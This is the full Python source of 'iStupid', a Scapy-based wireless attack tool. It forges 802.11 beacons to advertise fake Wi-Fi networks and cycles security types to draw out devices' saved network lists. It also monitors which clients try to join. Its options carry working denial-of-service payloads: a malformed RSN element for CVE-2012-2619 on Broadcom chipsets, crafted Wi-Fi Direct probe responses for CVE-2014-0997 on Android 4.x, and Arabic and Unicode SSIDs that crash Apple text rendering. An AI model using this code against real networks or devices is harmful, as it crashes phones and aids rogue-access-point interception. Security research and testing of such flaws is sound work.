#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    iStupid: indiscreet SSID tool (for the) unknown PNL (on) iOS devices

    Tool that creates fake Wi-Fi networks by injecting 802.11 beacon frames...
    ... and more :-) (such as a few Wi-Fi DoS attacks).
    Make those faraway Wi-Fi networks show up in the air!
"""

"""
    Version history:
    1.5 - Added the "--unicode-dos" option for Apple notification messages DoS attacks 
          using unicode characters, from May 2015 (no CVE available).
    1.4 - Added the "--cve-2014-0997" option for Wi-Fi Direct DoS attacks against
          Android 4.x mobile devices (CVE-2014-0997).
          URL: http://www.coresecurity.com/advisories/android-wifi-direct-denial-service
    1.3 - Added the "--non_bcast" option to be able to create non-broadcast or
          hidden networks, which helps 'motivating' clients to disclose their PNL.
        - Function used to generate random BSSID has been modified to avoid using
          locally administered MAC addresses.
    1.2 - Changed (c) to Dino Security SL.
        - Added enhancements to the client monitoring capabilities replacing
          the capture of Probe Request frames with Authentication and 
          Association Requests frames ("-m" or "--mac" option).
          Changed class from ProbeRequestMonitor() to FrameRequestMonitor().
          Probe Requests create lots of false positives when monitoring clients
          to discover the Wi-Fi network security type, specially with clients
          that disclose their PNL by default or with hidden networks :( (as
          the client will send Probe Requests periodically and not just when
          the right Wi-Fi network (SSID and security type) is on the air.
    1.1 - Added the "--arabic-dos" option for Apple CoreText API DoS attacks 
          using arabic characters (no CVE available).
    1.0 - Original version.
"""

__author__    = "Raul Siles"
__email__     = "raul@dinosec.com"
__copyright__ = "Copyright (c) 2015 Dino Security SL (www.dinosec.com)"
__license__   = "GPL"
__version__   = "1.5"
__date__      = "2015-05-29"

# Suppress python warning message:
# WARNING: No route found for IPv6 destination :: (no default route?)
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
import os
import signal
import argparse
import errno

from time import sleep
from struct import pack, unpack
from argparse import RawTextHelpFormatter
from scapy.all import *

# FrameRequestMonitor threading
from multiprocessing import Process

# Frame Request Monitor
class FrameRequestMonitor:
    """
    Frame Request Monitor:
    Monitor Wi-Fi clients (MAC address(es)) asking for a specific SSID.
    
    Enhanced to replace Probe Requests by Authentication and Association 
    Requests. Changed the original class name from ProbeRequestMonitor() to
    FrameRequestMonitor().
    """

    # INIT
    def __init__(self, interface, mac, ssid, bssid, verbose):
        # List of already observed Wi-Fi client MAC addresses
        self.observedclients = []
        self.interface = interface
        self.mac = mac
        self.ssid = ssid
        self.bssid = bssid
        self.verbose = verbose
        self.p = Process(target = self.run)

    # Is the 802.11 frame (pkt) an Authentication Request?
    #
    # The same frame type (type = 0, subtype = 11) is used for both 
    # Authentication req & resp: wlan.fc.type_subtype eq 11
    #
    # This trick is based on checking the Auth Request sequence number: 
    # - the (1st) request uses seqnum "1" and the response uses "2"...
    #
    # Potentially we could check which frame is a response for a given request
    # frame, but it would require processing them all: 
    # pkt-resp.answers(pkt-req), returns 1 if it is, 0 if it is not
    #
    def isauthenticationrequest(self, pkt):
        check = 0
        if pkt.haslayer(Dot11):
            # if pkt.type == 0 and pkt.subtype == 11:
            if pkt.haslayer(Dot11Auth):
                if pkt[Dot11Auth].seqnum == 1: # first request
                    check = 1
        return check

    # Record and print the client MAC address 
    def recordandprintclient(self, clientmac, frametype):

        # When monitoring all clients, or a single client, 
        # print the client(s) MAC address(es) only once
        if (self.mac.lower() == "ff:ff:ff:ff:ff:ff".lower()) or \
           (self.mac.lower() == clientmac.lower()): 
            if (clientmac not in self.observedclients): 
                # No multithreading sync before printing...
                if self.verbose:
                    sys.stdout.write(" ["+clientmac+"] "+"("+\
                                     frametype+") ")
                else:
                    sys.stdout.write(" ["+clientmac+"] ")
                sys.stdout.flush()
                self.observedclients.append(clientmac)

    # Process multiple request frames: Auth & Assoc Requests
    # (Probe Requests are not processed any more to avoid false positives)
    def sniffrequests(self, pkt):
        frametype = ""
        #if pkt.haslayer(Dot11ProbeReq):
        #    frametype = "probe"
        if pkt.haslayer(Dot11AssoReq):
            frametype = "assoc"
        elif self.isauthenticationrequest(pkt): 
            frametype = "auth"

        # If 802.11 frame is an Association Request
        #if pkt.haslayer(Dot11ProbeReq) or pkt.haslayer(Dot11AssoReq):
        if pkt.haslayer(Dot11AssoReq):
            # Extract Wi-Fi client MAC and SSID from the Association Request
            # (Scapy provides MAC addresses in lowercase)
            clientmac = pkt[Dot11].addr2    # pkt.addr2
            ssid = pkt[Dot11Elt].info       # pkt.info

            # If SSID matches...
            if (ssid == self.ssid):
                self.recordandprintclient(clientmac,frametype)

        # If 802.11 frame is an Authentication Request
        elif self.isauthenticationrequest(pkt): 
            # Extract BSSID from the Authentication Request, as there is
            # no SSID in this type of frame
            # (Scapy provides MAC addresses in lowercase)
            clientmac = pkt[Dot11].addr2    # pkt.addr2
            bssid = pkt[Dot11].addr3        # pkt.addr3

            # If BSSID matches...
            if (bssid.lower() == self.bssid.lower()):
                self.recordandprintclient(clientmac,frametype)

    # RUN
    def run(self):
        try:
            # The Scapy sniff() function uses the monitor interface & calls
            # the sniffrequest() function for each packet received...
            sniff(iface=self.interface, prn=self.sniffrequests)
        except KeyboardInterrupt:
            # The Scapy /usr/lib/python2.7/dist-packages/scapy/sendrecv.py
            # uses "break" vs. "raise" (line 575) for the KeyboardInterrupt :(
            # So we never get the interruption here, but a generic exception.
            exit(0)
        except:
            exit(0)

    # START
    def start(self):
        # Start monitoring...
        self.p.start()

    # STOP
    def stop(self):
        # Stop monitoring...
        self.p.terminate()
        self.p.join()


# Variables (and default values)

interface = ""
ssid = ""
bssid = ""
dst = ""
channel = 1
verbose = False
non_bcast = False
open = False
wep = False
wpa = False
wpa2 = False
wpa_enterprise = False
wpa2_enterprise = False
loop = False
cve_2012_2619 = False
cve_2014_0997 = False
arabic_dos = False
unicode_dos = False
rates = "11g" # 11b, 11b -- TODO: 11n
maxssidlen = 32
min_channel = 1
max_channel = 14 # Japan
monitor = False # Do not monitor any client by default
mac = ""

# Arabic (& Unicode) DoS
reload(sys)  # Reload does the trick!
sys.setdefaultencoding('UTF-8')

# Start time
starttime = time.time()

# Beacon interval (secs and ms)
beacon_interval_secs = 0.100 # (secs) 0.1 = 100ms
beacon_interval = int(beacon_interval_secs * 1000) # (ms) 100ms

# iOS devices probe for networks every... (determine the best loop_count)
# - 8-9 secs aprox. (at least in iOS 6.1.3 - iPhone 4S)
# - 12 secs aprox. (at least in iOS 6.1.2 - iPad 3)

# Number of frames per network type while looping
loop_count = 300 
# Time interval during each loop (default: 30 secs)
loop_secs = loop_count * beacon_interval_secs


# Generate a properly formated 802.11 sequence number
# From: https://code.google.com/p/eapeak/source/browse/lib/eapeak/inject.py
# (eapeak)
def __unfuckupSC__(sequence, fragment = 0):
    """
    This is a reserved method to return the sequence number in a way
    that is not fucked up by a bug in how the SC field is packed in
    Scapy.
    """
    SC = (sequence - ((sequence >> 4) << 4) << 12) + (fragment << 8) + \
        (sequence >> 4) # bit shifts FTW!
    return unpack('<H', pack('>H', SC))[0]


# Build beacon frames
def buildBeacon():

    # Channel to DSset: 
    # E.g. channel 3 is '\x03'
    dsset = chr(channel)
    
    # Initial beacon timestamp
    ts = 00000000L

    # Privacy settings: beacon header
    if wep or wpa or wpa2 or wpa_enterprise or wpa2_enterprise or cve_2012_2619 or \
       arabic_dos or unicode_dos:
        beacon_header = Dot11Beacon(timestamp=ts, beacon_interval=beacon_interval,\
                    cap="short-preamble+short-slot+ESS+privacy")
    else: # open 
        beacon_header = Dot11Beacon(timestamp=ts, beacon_interval=beacon_interval,\
                    cap="short-preamble+short-slot+ESS")

    # Rates settings
    if rates == "11b":
        # 802.11b
        rates_header = Dot11Elt(ID="Rates",info='\x82\x84\x8b\x16')
    elif rates == "11g": # (DEFAULT)
        # 802.11g: 1(B), 2(B), 5.5(B), 11(B), 18, 24, 36 54
        rates_header = Dot11Elt(ID="Rates",info='\x82\x84\x8b\x96\x24\x30\x48\x6c')
    # elif ...
    # TODO: Add rates and extra headers for 802.11n
    else:
        error("wrong rate type: {0} (11b or 11g)".format(rates))

    # Extra headers: "Barker Preamble Mode: Set"
    #Dot11Elt(ID=42, info="\x04")/Dot11Elt(ID=47, info="\x04")

    # If it is a hidden or non-broadcast network, clear the SSID in beacons
    if non_bcast:
        realssid = ""
    else:
        realssid = ssid

    beacon = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=bssid,addr3=bssid)/\
        beacon_header/\
        Dot11Elt(ID="SSID",info=realssid)/\
        Dot11Elt(ID="DSset",info=dsset)/\
        rates_header/\
        Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")/\
        Dot11Elt(ID=50,info="\x0c\x12\x18\x60") 
        # Extended supported rates (50): 6, 9, 12, 48

    # Privacy settings: extra RSN headers
    if wpa:
        # WPA-Personal TKIP: 
        extra_privacy_header = Dot11Elt(ID=221, info="\x00\x50\xf2\x01\x01\x00"+
                # OUI (Microsoft) + WPAv1
                "\x00\x50\xf2\x02"+
                # The last "\x02" means TKIP for Multicast (1st)
                "\x01\x00"+"\x00\x50\xf2\x02"+
                # The last "\x02" means TKIP for Unicast (2nd)
                "\x01\x00"+"\x00\x50\xf2\x02")
                # The last "\x02" means PSK auth

        # WPA-Personal AES-CCMP: 
        #extra_privacy_header = Dot11Elt(ID=221, info="\x00\x50\xf2\x01\x01\x00"+
                # OUI (Microsoft) + WPAv1
        #       "\x00\x50\xf2\x04"+
                # The last "\x04" means AES-CCMP for Multicast (1st)
        #       "\x01\x00"+"\x00\x50\xf2\x04"+
                # The last "\x04" means AES-CCMP for Unicast (2nd)
        #       "\x01\x00"+"\x00\x50\xf2\x02")
                # The last "\x02" means PSK auth

        beacon = beacon/extra_privacy_header
    elif wpa2:
        # WPA2-Personal AES-CCMP: (RSN information = 48)
        extra_privacy_header = Dot11Elt(ID=48, info="\x01\x00"+ # RSN v1
                "\x00\x0f\xac\x04"+"\x01\x00"+
                # The last "\x04" means AES-CCMP for Multicast (1st)
                "\x00\x0f\xac\x04"+"\x01\x00"+
                # The last "\x04" means AES-CCMP for Unicast (2nd)
                "\x00\x0f\xac\x02"+
                # The last "\x02" means PSK auth
                "\x00\x00")
                # RSN capabilities

        # WPA2-Personal TKIP+AES-CCMP: (RSN information = 48)
        #extra_privacy_header = Dot11Elt(ID=48, info="\x01\x00"+ # RSN v1
        #       "\x00\x0f\xac\x02"+"\x02\x00"+
                # The last "\x02" means TKIP for Multicast (1st) + 2 suites:
        #       "\x00\x0f\xac\x04"+
        #       "\x00\x0f\xac\x02"+"\x01\x00"+
                # The "\x04" & "\x02" means AES-CCMP & TKIP for Unicast (2nd)
        #       "\x00\x0f\xac\x02"+
                # The last "\x02" means PSK auth
        #       "\x00\x00")
                # RSN capabilities

        beacon = beacon/extra_privacy_header
    elif wpa_enterprise:
        # WPA-Enterprise TKIP:
        extra_privacy_header = Dot11Elt(ID=221, info="\x00\x50\xf2\x01\x01\x00"+
                # OUI (Microsoft) + WPAv1
                "\x00\x50\xf2\x02"+
                # The last "\x02" means TKIP for Multicast (1st)
                "\x01\x00"+"\x00\x50\xf2\x02"+
                # The last "\x02" means TKIP for Unicast (2nd)
                "\x01\x00"+"\x00\x50\xf2\x01")
                # The last "\x01" means WPA (Enterprise) auth

        # WPA-Enterprise AES-CCMP:
        #extra_privacy_header = Dot11Elt(ID=221, info="\x00\x50\xf2\x01\x01\x00"+
                # OUI (Microsoft) + WPAv1
        #       "\x00\x50\xf2\x04"+
                # The last "\x04" means AES-CCMP for Multicast (1st)
        #       "\x01\x00"+"\x00\x50\xf2\x04"+
                # The last "\x04" means AES-CCMP for Unicast (2nd)
        #       "\x01\x00"+"\x00\x50\xf2\x01")
                # The last "\x01" means WPA (Enterprise) auth

        beacon = beacon/extra_privacy_header
    elif wpa2_enterprise:
        # WPA2-Enterprise AES-CCMP: (RSN information = 48)
        extra_privacy_header = Dot11Elt(ID=48, info="\x01\x00"+ # RSN v1
                "\x00\x0f\xac\x04"+"\x01\x00"+
                # The last "\x04" means AES-CCMP for Multicast (1st)
                "\x00\x0f\xac\x04"+"\x01\x00"+
                # The last "\x04" means AES-CCMP for Unicast (2nd)
                "\x00\x0f\xac\x01"+
                # The last "\x01" means WPA2 (Enterprise) auth
                "\x01\x00")
                # RSN capabilities: RSN Pre-Auth

        # WPA2-Enterprise TKIP+AES-CCMP: (RSN information = 48) ... or 221
        #extra_privacy_header = Dot11Elt(ID=48, info="\x01\x00"+ # RSN v1
        #       "\x00\x0f\xac\x02"+"\x02\x00"+
                # The last "\x02" means TKIP for Multicast (1st) + 2 suites:
        #       "\x00\x0f\xac\x04"+
        #       "\x00\x0f\xac\x02"+"\x01\x00"+
                # The "\x04" & "\x02" means AES-CCMP & TKIP for Unicast (2nd)
        #       "\x00\x0f\xac\x01"+
                # The last "\x01" means WPA2 (Enterprise) auth
        #       "\x01\x00")
                # RSN capabilities

        beacon = beacon/extra_privacy_header
    elif cve_2012_2619:
        # CVE-2012-2619 (very similar to WPA2-PSK AES)
        extra_privacy_header = Dot11Elt(ID=48, info="\x01\x00"+
                "\x00\x0f\xac\x04"+"\x01\x00"+
                "\x00\x0f\xac\x00"+"\xff\xff"+
                "\x00\x0f\xac\x02"+"\x00\x00")
        beacon = beacon/extra_privacy_header
    elif arabic_dos:
        beacon = beacon
    elif unicode_dos:
        beacon = beacon
    else:
        pass

    # Future extra headers: TODO
    #
    # WMM/WME:
    # extra_wmm_header = Dot11Elt(ID=221, info="\x00\x50\xf2\x02\x01\x01"+
    #           "\x84\x00\x03\xa4"+"\x00\x00"+"\x27\xa4\x00\x00"+
    #           "\x42\x43\x5e\x00\x62\x32\x2f\x00")
    #
    # WPS:
    # ...

    return beacon

# Convert string to (hex) MAC address (CVE-2014-0997)
def mac2str(mac):
    return "".join(map(lambda x: chr(int(x,16)), mac.split(":")))

# Build probe response frames
def buildProbeResponse():

    # Channel to DSset: 
    # E.g. channel 3 is '\x03'
    dsset = chr(channel)
    
    # Initial beacon timestamp
    ts = 00000000L

    # Privacy setting on: probe response header
    probresp_header = Dot11ProbeResp(timestamp=ts, beacon_interval=beacon_interval,\
                                     cap="short-preamble+short-slot+privacy")

    # Rates settings
    if rates == "11b":
        # 802.11b
        rates_header = Dot11Elt(ID="Rates",info='\x82\x84\x8b\x16')
    elif rates == "11g": # (DEFAULT)
        # 802.11g: 1(B), 2(B), 5.5(B), 11(B), 18, 24, 36 54
        rates_header = Dot11Elt(ID="Rates",info='\x82\x84\x8b\x96\x24\x30\x48\x6c')
    # elif ...
    # TODO: Add rates and extra headers for 802.11n
    else:
        error("wrong rate type: {0} (11b or 11g)".format(rates))

    # Destination address for Probe Responses shouldn't be FF:...:FF but directed
    
    probeResponse = RadioTap()/Dot11(addr1=dst,addr2=bssid,addr3=bssid)/\
        probresp_header/\
        Dot11Elt(ID="SSID",info=ssid)/\
        Dot11Elt(ID="DSset",info=dsset)/\
        rates_header/\
        Dot11Elt(ID=221,info="\x50\x6F\x9A\x09"+   # P2P
        	"\x02"+"\02\x00"+"\x21\x00"+       # P2P Capabilities
        	"\x0D"+"\x1B\x00"+
                mac2str(bssid)+
                "\x01\x88"+
                "\x00\x0A\x00\x50\xF2\x04\x00\x05"+
                "\x00"+
                "\x10\x11"+
                "\x00\x06"+
                "fafa\xFA\xFA")                    # P2P Device Info

    return probeResponse

# Switch the security settings (type) of the network
def switchNetworkType(p):
    """
    Looping through the different network types: 
    OPEN, WEP, WPA-Personal, WPA2-Personal, WPA-Enterprise, and WPA2-Enterprise
    
    The parameter 'p' (boolean) indicates if the network type must be printed.
    """

    global open, wep, wpa, wpa2, wpa_enterprise, wpa2_enterprise
    str = ""

    if open:
        # It's OPEN, switch to WEP
        open = False
        wep = True
        if p:
            str = "wep"
    elif wep:
        # It's WEP, switch to WPA
        wep = False
        wpa = True 
        if p:
            str = "wpa-psk"
    elif wpa:
        # It's WPA, switch to WPA2
        wpa = False
        wpa2 = True
        if p:
            str = "wpa2-psk" 
    elif wpa2:
        # It's WPA2, switch to WPA-Enterprise
        wpa2 = False
        wpa_enterprise = True
        if p:
            str = "wpa-eap"
    elif wpa_enterprise:
        # It's WPA-Enterprise, switch to WPA2-Enterprise
        wpa_enterprise = False
        wpa2_enterprise = True
        if p:
            str = "wpa2-eap"
    elif wpa2_enterprise:
        # It's WPA2-Enterprise, switch to OPEN
        wpa2_enterprise = False
        open = True
        if p:
            str = "open"
    if p:
        sys.stdout.write("\n{%s} " % str)
        sys.stdout.flush()


# Send beacon frames
def sendBeacons():

    global open

    # Sequence number (Dot11.SC)
    sequence = 0

    # Loop: number of frames sent for the current network type
    frames = 0

    # Print network type
    printnetworktype = False
    if loop or verbose:
        printnetworktype = True

    # Start loop in OPEN mode by default
    if loop:
        open = True
        if printnetworktype:
            sys.stdout.write("{open} ")
            sys.stdout.flush()

    beacon = buildBeacon()
    
    try:
        while True:

            if loop:
                if frames > loop_count:
                    # Change to the next network type: 
                    # OPEN, WEP, WPA(2)-Personal, WPA(2)-Enterprise
                    frames = 1
                    switchNetworkType(printnetworktype)
                    beacon = buildBeacon()
                else:
                    frames += 1

            # Sequence number
            sequence = sequence % 4096

            ##beacon.getlayer(Dot11).SC = struct.pack('H', sequence)
            beacon.getlayer(Dot11).SC = __unfuckupSC__(sequence)

            sequence += 1
            if verbose:
                if sequence >= 4096:
                    sys.stdout.write("*")
                else:
                    #sys.stdout.write(".\b")
                    sys.stdout.write(".")
                sys.stdout.flush()

            # Increase the beacon timestamp over time
            now = time.time() - starttime
            ts = now * 1000000
            ##ts = struct.pack('Q', time.time())
            beacon.getlayer(Dot11Beacon).timestamp = ts

            # sendp(): inter & loop can be used if frames do not change 
            # (e.g. no change in sequence number)
            ##sendp(beacon, iface=interface, loop=1, inter=beacon_interval_secs)
            sendp(beacon, iface=interface, verbose=False)
            sleep(beacon_interval_secs)

    except socket.error as e:
        # http://docs.python.org/2/library/errno.html
        if e.errno == errno.ENODEV:
            # socket.error: [Errno 19] No such device
            parser.print_help()
            error("wrong local interface name: {0}".format(interface))
        else:
            raise

# Send probe response frames
def sendProbeResponses():

    probeResponse = buildProbeResponse()
    
    try:
        while True:
            if verbose:
                sys.stdout.write(".")
                sys.stdout.flush()

            # sendp(): inter & loop can be used if frames do not change 
            # (e.g. no change in sequence number)
            sendp(probeResponse, iface=interface, loop=1, inter=beacon_interval_secs)
            #sendp(probeResponse, iface=interface, verbose=False)
            #sleep(beacon_interval_secs)

    except socket.error as e:
        # http://docs.python.org/2/library/errno.html
        if e.errno == errno.ENODEV:
            # socket.error: [Errno 19] No such device
            parser.print_help()
            error("wrong local interface name: {0}".format(interface))
        else:
            raise
            
# Print monitor details
def printMonitor():
    if mac.lower() == "ff:ff:ff:ff:ff:ff":
        print("Monitoring all Wi-Fi clients for SSID {0} ({1})".\
             format(ssid,bssid))
    else:
        print("Monitoring Wi-Fi client {0} for SSID {1} ({2})".\
             format(mac,ssid,bssid))

# Print AP details
def printAP():
    if open:
        privacy = "OPEN"
    elif wep:
        privacy = "WEP"
    elif wpa:
        privacy = "WPA-Personal"
    elif wpa2:
        privacy = "WPA2-Personal"
    elif wpa_enterprise:
        privacy = "WPA-Enterprise"
    elif wpa2_enterprise:
        privacy = "WPA2-Enterprise"
    elif loop:
        privacy = "looping - "+ str(int(loop_secs)) +" secs"
    elif cve_2012_2619:
        privacy = "CVE-2012-2619"
    elif arabic_dos:
        privacy = "Arabic DoS"
    elif unicode_dos:
        privacy = "Unicode DoS"
    else:
        privacy = "UNKNOWN"

    if non_bcast:
        hidden = "hidden"
    else:
        hidden = ""

    print("Interface: {0}  [{1} ms ({2} secs); security: {3}; rates: {4}]".\
        format(interface,beacon_interval,beacon_interval_secs,privacy,rates))
    print("SSID: {0} ({1}), BSSID: {2}, Channel: {3}".\
        format(ssid,hidden,bssid,channel))

# Print Probe Response details
def printProbeResponse():
    privacy = "CVE-2014-0997"
    print("Interface: {0}  [{1} ms ({2} secs); security: {3}; rates: {4}]".\
        format(interface,beacon_interval,beacon_interval_secs,privacy,rates))
    print("Probe Response: {0}, Source: {1}, Channel: {2}".\
        format(ssid,bssid,channel))
    print("Destination (target): {0}".format(dst))
    
# Stop AP if interrupted (Ctrl+C)
def signal_handler(signal, frame):
    # Stop the monitoring process...
    if monitor:
        prm.stop()
    print("\n")
    print("Stopping Wi-Fi AP...")
    sys.exit(0)

# Print error message and exit
def error(msg):
    print("\n[!] Error: {0}\n".format(msg))
    sys.exit(1)

# Check if a MAC address has the right format
def validMAC(mac):
    # Check if the argument is a valid MAC address
    # If we would like to accept both ":" (Linux) and "-" (Windows) as 
    # MAC address byte separators... use this regex instead:
    # re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower())
    return re.match("([a-fA-F0-9]{2}[:|\-]?){6}$", mac.lower())

# Returns a string with a randomly generated unicast MAC address
# From: http://hozomean.blogspot.com.es/2012/09/
#       for-ultra-paranoid-randomizing-your-mac.html
# Modified to also avoid using locally administered MAC addresses.
# See: http://en.wikipedia.org/wiki/MAC_address
#
def RandUnicastMAC():
    mac = '';
    i = 0
    count = 6
    while i < count:
        # If the least significant bit (LSB) of the first byte is one (odd number), 
        # it is a multicast MAC address (we want a unicast MAC address)
        multicast_hex = ['1', '3', '5', '7', '9', 'b', 'd', 'f']
        # If the second least significant bit (LSB) of the first byte is one, 
        # it is a locally administered MAC address (we want a universal MAC address)
        localadmin_hex = ['2', '6', 'a', 'e']
        octet = hex(random.randint(0, 255))
        octet = octet.replace('0x', '')
        if len (octet) == 1:
            octet = '0' + octet
        if (i != 0) or ((octet[1] not in multicast_hex) \
                         and (octet[1] not in localadmin_hex)):
            mac += octet
            if i != 5:
                mac += ':'
            i=i+1
    return mac


# MAIN
if __name__ == "__main__":

    # Parse arguments...
    parser = argparse.ArgumentParser(description='\tiStupid (v'+__version__+' - '+__date__+'):\n\tindiscreet SSID tool (for the) unknown PNL (on) iOS devices\n\n\t'+__copyright__+' - '+__author__+'\n\n\tTool that creates fake Wi-Fi networks by injecting 802.11 beacon frames.\n\n', formatter_class=RawTextHelpFormatter, epilog='Make those faraway Wi-Fi networks show up in the air!\n\n')
    # General flags:
    parser.add_argument("interface", help="local Wi-Fi interface (e.g. mon0)")
    parser.add_argument("-s", "--ssid", help="Wi-Fi network name (SSID)"+
                        " (default = random)")
    parser.add_argument("-c", "--channel", type=int, help="Wi-Fi network channel"+
                        " (default = 1)")
    parser.add_argument("-b", "--bssid", help="Wi-Fi network address (BSSID)"+
                        " (default = random)")
    parser.add_argument("-d", "--dst", help="Wi-Fi target destination address"+
                        " (default = None)")
    parser.add_argument("-n", "--non_bcast", action="store_true",\
                        help="make the network hidden or non-broadcast (default = off)")
    parser.add_argument("-i", "--interval", help="Wi-Fi beacon interval (ms)"+
                        " (default = 100)")
    parser.add_argument("-l", "--loop_interval", help="loop interval (secs)"+
                        " (default = 30)")
    parser.add_argument("-t", "--rates", help="Wi-Fi network rates: 11b or 11g"+
                        " (default = 11g)")
    parser.add_argument("-V", "--version", action='version', version=__version__,\
                        help="show version information and exit")
    parser.add_argument("-v", "--verbose", action="store_true",\
                        help="increase output verbosity (default = off)")
    # Monitor specific client?
    parser.add_argument("-m", "--mac", help="Wi-Fi client MAC address to monitor:"+
                        " (default = off)\nE.g. 00:01:02:0a:0b:0c\n"+
                        "Use ff:ff:ff:ff:ff:ff to monitor all Wi-Fi clients.")
    # Privacy and security flags:
    group_privacy = parser.add_mutually_exclusive_group()
    group_privacy.add_argument("--open", action='store_true',\
                help="create an OPEN Wi-Fi network (default = on)")
    group_privacy.add_argument("--wep", action='store_true',\
                help="create a WEP Wi-Fi network (default = off)")
    group_privacy.add_argument("--wpa", action='store_true',\
                help="create a WPA-Personal Wi-Fi network (default = off)")
    group_privacy.add_argument("--wpa2", action='store_true',\
                help="create a WPA2-Personal Wi-Fi network (default = off)")
    group_privacy.add_argument("--wpa-enterprise", action='store_true',\
                help="create a WPA-Enterprise Wi-Fi network (default = off)")
                # wpa_enterprise
    group_privacy.add_argument("--wpa2-enterprise", action='store_true',\
                help="create a WPA2-Enterprise Wi-Fi network (default = off)")
                # wpa2_enterprise
    group_privacy.add_argument("--loop", action='store_true',\
                help="loop through the various network types: (default = off)\n"+
                "OPEN, WEP, WPA(2)-Personal, and WPA(2)-Enterprise.")
    group_privacy.add_argument("--cve-2012-2619", action='store_true',\
                help="CVE-2012-2619: Broadcom chipsets DoS (default = off)")
                # cve_2012_2619
    group_privacy.add_argument("--arabic-dos", action='store_true',\
                help="Arabic characters DoS in Apple CoreText (default = off)")
                # arabic_dos
    group_privacy.add_argument("--unicode-dos", action='store_true',\
                help="Unicode characters DoS in Apple notifications (default = off)")
                # unicode_dos
    group_privacy.add_argument("--cve-2014-0997", action='store_true',\
                help="CVE-2014-0997: Wi-Fi Direct DoS in Android 4.x (default = off)"+
                "\n- Use the --bssid option to specify the Probe Response source address"+
                "\n- Use the --interval option to specify the Probe Response frequency"+
                "\n- Use the --dst option to specify the Probe Response destination address")
                # cve_2014_0997
    
    args = parser.parse_args()

    if args.interface != None:
        interface = args.interface
    else:
        parser.print_help()
        error("it is mandatory to specify the local interface name.")
    
    if args.arabic_dos != None:
        arabic_dos = args.arabic_dos

    if args.unicode_dos != None:
        unicode_dos = args.unicode_dos
        
    if args.verbose != None:
        verbose = args.verbose
        
    if args.non_bcast != None:
        non_bcast = args.non_bcast

    if args.channel != None:
        if (args.channel < min_channel or args.channel > max_channel):
            parser.print_help()
            error("wrong channel number: {0} ({1}-{2})".\
                  format(args.channel,min_channel,max_channel))
        else:
            channel = args.channel

    # Arabic DoS SSID
    if args.arabic_dos:
        #ssid = u'سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ'
        # 31 bytes
        ssid='سمَـَّوُوُحخ ̷̴̐'
    
    # Unicode DoS SSID
    elif args.unicode_dos:
        #ssid = u'effective. \nPower\nلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ\n 冗'
        # Several bytes
        ssid='رً ॣ ॣ ॣ'

    else:
        if args.ssid != None:
            ssid = args.ssid
        else:
        # The Rand...() is a class that provides a random value every time
        # you query the associated variable (or any reference). Use str()
        # to get a fix/static string of that random value:
        # ssid = RandString(RandNum(1,maxssidlen))
            ssid = str(RandString(RandNum(1,maxssidlen)))

    if args.bssid != None:
        bssid = args.bssid
    else:
        # iOS devices do not see Wi-Fi APs whose BSSID is a multicast address:
        # (multicast address == The LSB of the first byte is equal to 1)
        bssid = RandUnicastMAC()

    if args.rates != None:
        if (arg.rates != "11b" and args.rates != "11g"): # TODO: 11n
            parser.print_help()
            error("wrong rate type: {0} (11b or 11g)".format(args.rates))
        else:
            rates = args.rates

    if args.mac != None:
        if validMAC(args.mac):
            mac = args.mac
            monitor = True
        else:
            parser.print_help()
            error("wrong Wi-Fi client MAC address: {0}".format(args.mac))

    if args.open:
        open = args.open
    elif args.wep:
        wep = args.wep
    elif args.wpa:
        wpa = args.wpa
    elif args.wpa2:
        wpa2 = args.wpa2
    elif args.wpa_enterprise:
        wpa_enterprise = args.wpa_enterprise
    elif args.wpa2_enterprise:
        wpa2_enterprise = args.wpa2_enterprise
    elif args.loop:
        loop = args.loop
    elif args.cve_2012_2619:
        cve_2012_2619 = args.cve_2012_2619
    elif args.cve_2014_0997:
        cve_2014_0997 = args.cve_2014_0997
    else:
        # Open Wi-Fi Network by default
        open = True

    if args.interval != None:
        beacon_interval = int(args.interval)
        beacon_interval_secs = beacon_interval/float(1000)  

    if args.loop_interval != None:
        if loop:
            loop_secs = int(args.loop_interval)
            loop_count = int(loop_secs/beacon_interval_secs)
        else:
            parser.print_help()
            error("loop interval can only be set in loop mode (--loop)")

    # Set a fixed channel
    try:
        os.system("iw dev %s set channel %d" % (interface, channel))
    except os.error as e:
        parser.print_help()
        error("wrong local interface name: {0}".format(interface))
    
    # Capture CTRL+C interruptions...
    signal.signal(signal.SIGINT, signal_handler)

    # Arabic DoS: (& Unicode DoS)
    # DEFAULT ENCODING HAS BEEN SET TO 'UTF-8' FROM 'ascii' INITIALLY!
    #
    #print "Default encoding: {0}.".format(sys.getdefaultencoding())
    #print "Stdout encoding: {0}.".format(sys.stdout.encoding)
    # E.g. for Python 2.x:
    #Default encoding: ascii.
    #Stdout encoding: UTF-8.

    # CVE-2014-0097
    if cve_2014_0997:
        if args.dst != None:
             dst = args.dst
        else:
             error("--dst option is mandatory when using CVE-2014-0997")

        # Wi-Fi Direct SSID in Android 4.x: "DIRECT-"
        ssid = "DIRECT-"
        
        # Print Probe Response details
        printProbeResponse()
    
        # Start sending probe responses...
        sendProbeResponses()
    else:
        # Print AP details
        printAP()

        # Start Frame Request Monitor if required by command line options (-m)
        if monitor:
            printMonitor()
            try:
                prm = FrameRequestMonitor(interface,mac,ssid,bssid,verbose)
                prm.start()
            except:
                print "Exiting Frame Request Monitor..."
                exit(0)

        # Start sending beacons...
        sendBeacons()
